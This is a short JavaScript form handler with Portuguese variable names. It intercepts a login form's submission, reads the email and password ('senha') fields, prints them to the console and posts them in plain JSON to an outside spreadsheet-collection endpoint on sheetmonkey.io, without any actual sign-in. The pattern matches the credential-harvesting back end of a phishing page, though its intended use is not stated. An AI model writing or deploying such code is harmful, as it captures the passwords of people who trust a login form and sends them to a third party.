var monkey = (event) => {
    event.preventDefault();
    var email = document.getElementById('iemail').value;
    var senha = document.getElementById('isenha').value;

    var letraE = String(email).length;
    var letraS = String(senha).length;

    if (letraE > 1 && letraS > 1) {
        console.log(email, senha);

        fetch('https://api.sheetmonkey.io/form/aMg4Fau8yyiKVsRUqCSS8N', {
            method: 'post',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ email: email, senha: senha })  // Corrigido aqui
        })
        .then(response => response.json())  // Tratar a resposta (opcional)
        .then(data => console.log(data))
        .catch(error => console.error('Erro:', error));
    }
}

document.querySelector('form').addEventListener('submit', monkey);
